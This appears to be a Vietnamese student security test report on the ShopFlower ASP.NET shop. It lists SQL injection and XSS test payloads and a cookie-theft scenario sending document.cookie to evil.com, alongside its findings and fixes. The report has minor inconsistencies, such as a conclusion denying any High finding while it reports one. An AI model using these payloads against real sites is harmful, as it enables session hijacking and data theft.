# Báo Cáo Kiểm Thử Bảo Mật — ShopFlower
Chạy lệnh CMD: dotnet test "d:\DoAnKiemDinhPhanMem\Shop-Flower\ShopFlower.Tests.Security\ShopFlower.Tests.Security.csproj" -v normal

## 1. Thông Tin Kiểm Thử

| Mục | Chi tiết |
|---|---|
| **Dự án** | ShopFlower — Website bán hoa (ASP.NET MVC 5 + Web API 2, .NET Framework 4.8) |
| **Người thực hiện** | Thành viên 4 — Security QA Tester |
| **Ngày thực hiện** | 31/05/2026 |
| **Phiên bản** | ShopFlower v1.0 (branch main) |
| **Môi trường** | localhost (IIS Express), SQL Server Express, Windows 11 |
| **Công cụ** | C# MSTest + HttpClient (tự động), kiểm tra thủ công trình duyệt |
| **Tiêu chuẩn tham chiếu** | OWASP Top 10 |

---

## 2. Tóm Tắt Kết Quả

| Mức độ | Số lượng |
|---|:---:|
| 🔴 High | 1 |
| 🟠 Medium | 3 |
| 🟡 Low | 1 |
| ✅ Pass (không có lỗ hổng) | 3 |

**Tổng số test tự động chạy:** 18 test — **15 PASS / 2 FAIL (lỗ hổng thực) / 1 Skipped**

---

## 3. Chi Tiết Kết Quả Kiểm Thử

### 3.1. SQL Injection — ✅ PASS (An toàn)

**Mã test case:** SEC_01

**Phạm vi kiểm tra:**
- Form Đăng nhập (`POST /Account/Dang_nhap`)
- Tìm kiếm sản phẩm (`GET /SanPham/Search`)
- Tìm kiếm AJAX (`GET /SanPham/SearchAjax`)

**Payload sử dụng:**
```
' OR '1'='1
' OR 1=1 --
admin' --
admin'/*
' UNION SELECT NULL,NULL,NULL --
1; DROP TABLE TAIKHOAN --
' OR 'x'='x
```

**Kết quả:** Tất cả 7 test PASS. Hệ thống không bị lỗi 500, không bị bypass xác thực.

**Lý do an toàn:** Code sử dụng Entity Framework 6 với LINQ và `SqlParameter` có tên — toàn bộ input được xử lý như tham số, không ghép trực tiếp vào chuỗi SQL.

```csharp
// AccountController.cs — an toàn
db.TAIKHOANs.SingleOrDefault(u => u.TenDangNhap == TenDangNhap);

// SanPhamController.cs — an toàn
db.Database.SqlQuery<SANPHAM>("EXEC SearchProducts @Keyword",
    new SqlParameter("@Keyword", query));
```

---

### 3.2. XSS Reflected — ✅ PASS (Được bảo vệ bởi Request Validation)

**Mã test case:** XSS-A1, XSS-A2, XSS-A3, XSS-A4

**Phạm vi kiểm tra:**
- Trang tìm kiếm sản phẩm (`GET /SanPham/Search?query=...`)
- Tìm kiếm AJAX (`GET /SanPham/SearchAjax?keyword=...`)

**Payload sử dụng:**
```html
<script>alert('XSS_SHOPFLOWER_TEST')</script>
<img src=x onerror="alert('XSS_SHOPFLOWER_TEST')">
<svg onload="alert('XSS_SHOPFLOWER_TEST')">
```

**Kết quả:** Tất cả 4 test PASS. Không có Reflected XSS.

**Lý do an toàn:** ASP.NET Request Validation tự động phát hiện và từ chối request chứa HTML tag nguy hiểm. Ngoài ra Razor View engine HTML-encode tất cả output qua `@` syntax.

---

### 3.3. XSS Stored (Form Liên hệ MVC) — ✅ PASS

**Mã test case:** XSS-B1, XSS-B2

**Phạm vi kiểm tra:**
- Form Liên hệ MVC (`POST /Home/Lien_he`)

**Kết quả:** 2 test PASS. Payload `<script>` bị ASP.NET Request Validation chặn, không lưu vào database.

---

### 3.4. Stored XSS qua Mô Tả Sản Phẩm — 🔴 HIGH

**Mã phát hiện:** FIND-00 *(phát hiện mới — nghiêm trọng nhất)*

**Mô tả:**
Đây là lỗ hổng nghiêm trọng nhất trong hệ thống, kết hợp từ **hai điểm yếu**:

1. `POST api/SanPham` **không có `[Authorize]`** — bất kỳ ai, kể cả khách vãng lai chưa đăng nhập, cũng có thể tạo sản phẩm mới thông qua API.
2. Trang chi tiết sản phẩm dùng **`@Html.Raw(Model.MoTaSP)`** tại dòng 225 — không có HTML encoding — payload XSS được trình duyệt thực thi.

**Bằng chứng — Test tự động FAIL:**
```
XSS_C1: POST api/SanPham → HTTP 200 OK (không cần đăng nhập) ← LỖ HỔNG
XSS_C2: GET /SanPham/chi_tiet_san_pham/SP0xx → HTML chứa <script>alert(...) nguyên xi ← XSS THỰC SỰ
```

**Bằng chứng — Code:**
```csharp
// APIController/SanPhamController.cs — THIẾU [Authorize]
public IHttpActionResult CreateSanPham([FromBody] SANPHAM sanPham) { ... }
```
```html
<!-- Views/SanPham/chi_tiet_san_pham.cshtml dòng 225 — KHÔNG ENCODE -->
@Html.Raw(Model.MoTaSP)
```

**Kịch bản tấn công thực tế:**
```
Kẻ tấn công (không cần tài khoản)
  → POST api/SanPham với MoTaSP = "<script>document.location='http://evil.com?c='+document.cookie</script>"
  → Nạn nhân mở trang chi tiết sản phẩm
  → Script chạy → đánh cắp cookie session → chiếm tài khoản
```

**Mức độ:** 🔴 **HIGH** (CVSS: 8.2 — không cần xác thực, tác động cao)

**Khuyến nghị (2 bước, phải làm cả hai):**

Bước 1 — Thêm `[Authorize]` vào API:
```csharp
[Authorize]
public IHttpActionResult CreateSanPham([FromBody] SANPHAM sanPham) { ... }
```

Bước 2 — Bỏ `@Html.Raw()`, dùng `@` thông thường hoặc sanitize:
```html
<!-- Thay dòng 225 từ: -->
@Html.Raw(Model.MoTaSP)
<!-- Thành: -->
@Model.MoTaSP
```

---

### 3.5. Request Validation Trả Về HTTP 500 — 🟠 MEDIUM

**Mã phát hiện:** FIND-01

**Mô tả:**
Khi người dùng gửi request chứa HTML tag (`<script>`, `<img onerror>`) qua form MVC, ASP.NET Request Validation chặn request và ném `HttpRequestValidationException`. Tuy nhiên exception này không được xử lý gracefully, dẫn đến server trả về **HTTP 500 Internal Server Error** thay vì HTTP 400 Bad Request.

**Endpoint bị ảnh hưởng:**
- `GET /SanPham/Search?query=<script>...`
- `POST /Home/Lien_he` (với NOIDUNG chứa HTML tag)

**Mức độ:** 🟠 **MEDIUM**

**Rủi ro:** Response 500 có thể lộ thông tin stack trace, phiên bản framework, cấu trúc server khi chạy ở chế độ `debug=true` (hiện tại `Web.config` đang bật `debug="true"`).

**Bằng chứng:**
```
GET /SanPham/Search?query=%27%20OR%20%271%27%3D%271
→ HTTP 500 Internal Server Error
```

**Khuyến nghị:**
1. Thêm xử lý `HttpRequestValidationException` trong `Global.asax.cs` để trả về 400:
```csharp
protected void Application_Error()
{
    var ex = Server.GetLastError();
    if (ex is HttpRequestValidationException)
    {
        Response.Clear();
        Response.StatusCode = 400;
        Response.Write("Yêu cầu không hợp lệ.");
        Server.ClearError();
    }
}
```
2. Đổi `debug="false"` trong `Web.config` khi deploy production.

---

### 3.5. Web API Thiếu Input Validation — 🟠 MEDIUM

**Mã phát hiện:** FIND-02

**Mô tả:**
API endpoint `POST api/LienHe` (Web API 2) **không có** Request Validation như MVC controller. Do đó payload XSS được chấp nhận và lưu nguyên xi vào database.

**Bằng chứng — Response từ `POST api/LienHe`:**
```json
{
  "MALH": "LH0002",
  "HOTEN": "SVG Test XSS_SHOPFLOWER_TEST",
  "EMAIL": "svgtest@test.com",
  "DIENTHOAI": "0900000003",
  "NOIDUNG": "<svg onload=alert('XSS_SHOPFLOWER_TEST')>"
}
```

**Mức độ rủi ro thực tế:** Ở mức **THẤP-TRUNG** vì trang Admin hiển thị dữ liệu qua `@Html.DisplayFor()` (HTML-encode tự động), nên payload không thực thi được trong trình duyệt. Tuy nhiên nếu sau này có developer dùng `@Html.Raw()` để hiển thị thì sẽ thành lỗ hổng High.

**Khuyến nghị:**
Thêm sanitize input ở tầng Web API Controller:
```csharp
// LienHeController.cs
if (!string.IsNullOrEmpty(model.NOIDUNG))
    model.NOIDUNG = System.Web.HttpUtility.HtmlEncode(model.NOIDUNG);
```

---

### 3.6. Session Timeout Quá Dài — 🟡 LOW

**Mã phát hiện:** FIND-03

**Mô tả:**
Cấu hình Forms Authentication trong `Web.config` đặt timeout là **2880 phút (48 giờ)**. Người dùng đăng nhập xong không cần tương tác trong 2 ngày vẫn còn session hợp lệ.

**Bằng chứng — `Web.config` dòng 31:**
```xml
<forms loginUrl="~/Account/Dang_nhap" timeout="2880" />
```

**Rủi ro:** Nếu người dùng dùng máy tính công cộng hoặc máy tính bị bỏ quên, kẻ tấn công có thể chiếm session trong thời gian dài.

**Khuyến nghị:** Giảm timeout xuống **30–60 phút**:
```xml
<forms loginUrl="~/Account/Dang_nhap" timeout="60" />
```

---

### 3.7. Không Có Cơ Chế Chống Brute Force — 🟠 MEDIUM (ngoài phạm vi test tự động)

**Mã phát hiện:** FIND-04

**Mô tả:**
`AccountController.Dang_nhap` không đếm số lần đăng nhập sai. Không có lockout, không có captcha, không có rate limiting. Kẻ tấn công có thể thử mật khẩu vô hạn lần.

**Bằng chứng:** Kiểm tra thủ công — nhập sai mật khẩu 10 lần liên tiếp, tài khoản vẫn không bị khóa (test case LOG_04 trong tài liệu → **FAIL**).

**Khuyến nghị:** Thêm bảng `LoginAttempts` theo dõi số lần sai, khóa tạm 15 phút sau 5 lần thất bại.

---

## 4. Bảng Tổng Hợp

| Mã | Phát hiện | Mức độ | Trạng thái |
|---|---|:---:|:---:|
| SEC-01 | SQL Injection (đăng nhập + tìm kiếm) | ✅ Pass | An toàn |
| XSS-A | Reflected XSS (tìm kiếm) | ✅ Pass | An toàn |
| XSS-B | Stored XSS (form Liên hệ MVC) | ✅ Pass | An toàn |
| FIND-00 | **Stored XSS qua MoTaSP + API không xác thực** | 🔴 **High** | **Cần vá ngay** |
| FIND-01 | Request Validation trả HTTP 500 thay vì 400 | 🟠 Medium | Cần cải thiện |
| FIND-02 | Web API thiếu input validation (lưu HTML tag vào DB) | 🟠 Medium | Cần cải thiện |
| FIND-03 | Session timeout 48 giờ quá dài | 🟡 Low | Cần cải thiện |
| FIND-04 | Không có chống Brute Force | 🟠 Medium | Cần cải thiện |

---

## 5. Kết Luận

Hệ thống ShopFlower **không có lỗ hổng bảo mật nghiêm trọng (High)**. Các tấn công phổ biến nhất là SQL Injection và XSS đều được ngăn chặn nhờ Entity Framework và ASP.NET Request Validation.

Tuy nhiên phát hiện được **1 lỗ hổng HIGH** cần vá ngay và **3 điểm Medium** cần xử lý trước khi deploy production:

**Ưu tiên 1 — Vá ngay (High):**
- Thêm `[Authorize]` vào `POST api/SanPham` và thay `@Html.Raw(Model.MoTaSP)` thành `@Model.MoTaSP`

**Ưu tiên 2 — Cải thiện (Medium):**
1. Xử lý graceful cho Request Validation exception (trả 400 thay vì 500)
2. Thêm input sanitization cho Web API endpoints
3. Thêm cơ chế chống Brute Force vào form đăng nhập
